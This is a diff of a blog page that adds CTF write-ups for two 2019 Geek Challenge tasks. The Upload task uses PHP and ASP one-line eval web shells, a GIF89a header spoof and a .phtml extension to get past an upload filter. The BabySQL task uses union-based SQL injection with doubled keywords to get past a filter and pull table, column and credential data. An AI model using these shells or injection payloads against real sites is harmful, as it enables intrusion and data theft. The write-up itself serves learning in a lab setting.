@@ -489,21 +489,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-04
+                    2023-01-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    8 分
                 </div>
                 
 
@@ -601,6 +601,19 @@
 <p><img src="https://img-blog.csdnimg.cn/b4f8a8a9ad7b479b87433f35e4a099d5.png" alt="1"><br>有secret.php文件<br><img src="https://img-blog.csdnimg.cn/950d2fd795e44872959f455c67bea634.png" alt="2">需要伪造，开始抓包改包</p>
 <p><img src="https://img-blog.csdnimg.cn/413437df593244f88a61ca81d55ac52b.png" alt="4"><img src="https://img-blog.csdnimg.cn/2539fa128ac14f49813b00779ced60f1.png" alt="在这里插入图片描述"></p>
 <p>继续改<br><img src="https://img-blog.csdnimg.cn/ca8fb6a9b04a44889273265f2145ace4.png" alt="5"><br>本地代理开启<br><img src="https://img-blog.csdnimg.cn/a430853e4d5f49b080bf1273ade3b6c4.png" alt="5"></p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><strong>文件上传</strong><br><img src="https://img-blog.csdnimg.cn/bcaa47b202f84691a8025030c81de3e1.png" alt="1"><br>一句话木马安排上！<code>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[111])&lt;/script&gt;</code>或<code>&lt;?php eval$_POST[111];?&gt;</code>本题中第二个不行，选第一个。他让上传一张图片，那我们就在抓包的时候改一下。</p>
+<p><img src="https://img-blog.csdnimg.cn/943f2c97506b44f2a89f2411ca82ea8b.png" alt="3"><br>结果没成功<br><img src="https://img-blog.csdnimg.cn/1d35bc7aa0804e2c8d483798fe1681c5.png" alt="2"><br>在一句话木马内容前面加入<strong>gif89a</strong>，如：gif89a &lt;%eval request(“xx”)%&gt; 然后将木马保存为图片的格式，如xxx.jpg，xx.gif文件头欺骗可以用来绕过简单的waf。</p>
+<p><strong>什么是GIF89a?</strong></p>
+<blockquote>
+<p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/77420aae89a84bcf8f5f4b088d5a2939.png" alt="5"><br>还是不行<br>后来发现是写成shell.phtml可以，<img src="https://img-blog.csdnimg.cn/eae751b2d53548b4a0a8e06cd5532007.png" alt="6"><br>蚁剑连接得到flag<br><img src="https://img-blog.csdnimg.cn/f2813def245f434e82b4e1bf716bab2a.png" alt="7"></p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://img-blog.csdnimg.cn/7c30418f57b942f6b50b6cd9438386cd.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/d1cfa48ceafa4f56b8d51e4c4c218199.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/97419c713baf4031b1bee85bcb3d2c48.png" alt="3"><br>可能是or被过滤了，那就双写绕过<br><img src="https://img-blog.csdnimg.cn/d6d8052077c14610b0e4be63ff5b83f7.png" alt="4"><br>成功！<br><img src="https://img-blog.csdnimg.cn/16958e2ab1af45e1ac30c433bef723af.png" alt="5"><br>经过测试，or,by,union,select,where,from,and都被过滤了，那就都进行双写绕过<br>爆出有哪些位置可以进行输出数据<br><code>1&#39; oorrder by 3#</code><br><em>经测试有3列</em></p>
+<p>查看数据库名字<br><code>1&#39; uunionnion selselectect 1,2,database()#</code></p>
+<p>爆破表名：<br><code>-1&#39; uunionnion seselectlect 1,2,group_concat(table_name) FFROMROM infoorrmation_schema.tables wherwheree table_schema=database()#</code><br><img src="https://img-blog.csdnimg.cn/d4a24a5c9e66422eaee2a7d97cc3e5ab.png" alt="6"></p>
+<p>爆破列名：<br><code>1&#39; ununionion seselectlect 1,2,group_concat(column_name) FRFROMOM infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#39;表名&#39;#</code><br><img src="https://img-blog.csdnimg.cn/489436bf5b2c4bed8b6d663e4c2fc9b3.png" alt="7"></p>
+<p>爆破数据：<br><code>1&#39; uniunionon seleselectct 1,2,group_concat(id,username,passwoorrd) FFROMROM 表名#</code><br>得到flag.<br><img src="https://img-blog.csdnimg.cn/0d1f40d27af84b55a5307d37c9174e27.png" alt="8"></p>
+<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>本题难度不大，主要进行双写绕过，其中or在被过滤时要注意<strong>information</strong>中的<strong>or</strong>也会过滤，所以要写成<strong>infoorrmation</strong></p>
 
                 
             </div>
@@ -1436,7 +1449,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">13.3k</span>&nbsp;字
+                class="white-color">13.8k</span>&nbsp;字
             
             
             
